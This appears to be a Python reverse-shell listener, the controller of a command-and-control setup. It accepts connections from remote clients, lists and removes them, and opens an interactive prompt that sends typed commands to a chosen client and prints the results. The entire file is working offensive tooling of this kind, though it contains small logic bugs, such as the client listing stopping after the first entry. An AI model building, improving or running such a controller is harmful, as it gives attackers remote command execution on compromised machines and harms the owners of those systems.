#!/usr/bin/python3
import socket
import sys
import threading
import os

client_list = []
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Clear screen
def clear():
    print("\033[H\033[J")

# Print menu
def printMenu():
    print("[1] List Active Clients")
    print("[2] Remove Connected Client")
    print("[3] Start A Shell With A Client\n")
    print("[X] Exit\n")

# Starts the listener
def startListener(HOST, PORT):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)

    # Accept connections
    while True:
        try:
            conn, addr = s.accept()
        except socket.error:
            print("Cannot assign requested address")
            sys.exit(1)
        finally:
             client_list.append(conn)
        
# List active clients
def activeClients():
     counter = 0

     clear()
     printMenu()
     # Print active clients
     for client in client_list:
      counter = counter + 1
      return f"[{counter}] {client.getpeername()}\n"

# Remove a client from both a list and close the connection     
def removeClient():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    selectedClientStr = input("\nTo Remove A Client, Type In Their Number: ")
    selectedClient = int(selectedClientStr)
    x = client_list[selectedClient - 1]

    if x in client_list:
        try:
            x.close()
            client_list.remove(x)
            clear()
            return"\nClient Removed Successfully\n"
        except Exception as e:
            clear()
            return f"\nError: {e}"
        

# Start a shell with a client 
def shell(conn):
    try:
        while True:
            command = input(f"shell > ")
            if command.lower() == "exit":
                break
            # Send the command to the client
            conn.send(command.encode())
            output = conn.recv(BUFFER_SIZE).decode()
            print(output)
    except Exception as e:
        print(f"Error: {e}")
        conn.close()

def main(HOST, PORT):
    isRunning = True
    menu = True
    print("""                             
   _____     __                                .__           
  /  _  \   |  | __ _______  _____      ______ |__| _____    
 /  /_\  \  |  |/ / \_  __ \ \__  \    /  ___/ |  | \__  \   
/    |    \ |    <   |  | \/  / __ \_  \___ \  |  |  / __ \_ 
\____|__  / |__|_ \  |__|    (____  / /____  > |__| (____  / 
        \/       \/               \/       \/            \/  
""")
    # Start the listener as a daemon
    listener = threading.Thread(target=startListener, args=(HOST, PORT))
    listener.daemon = True
    listener.start()
    
    print(f"""                             
Listening: {HOST} : {PORT}\n 
""")
    try:
        while(isRunning):
        # Print menu but once a user selects an option, it will not be printed again - Redo this logic later makes no sense but works for now
            if menu:
                printMenu()
                menu = False

            option = input("Select An Option: ")

            # Handle user inputs for 1,2,3 and X
            if option == "1":
                print(activeClients())

            elif option == "2":
                if len(client_list) < 1:
                    clear()
                    printMenu()
                    print("Error: No Active Clients Connected\n")
                    continue
                print(activeClients())
                print(removeClient())

            elif option == "3":
                print(activeClients())

                # Check if there are active clients before starting a shell
                if len(client_list) < 1:
                    continue
                selectedClientStr = input("To Start A Shell, Type In The Client Number: ")
                selectedClient = int(selectedClientStr)
                x = client_list[selectedClient - 1]
                shell(x)
            else:
                clear()
                print("Invalid Option\n")
                menu = True
    except KeyboardInterrupt:
        print("\n")
        pass
    finally:
        sys.exit(0)



HOST = sys.argv[1]
PORT = int(sys.argv[2])
# HOST = "127.0.0.1"
# PORT = 8080
main(HOST, PORT)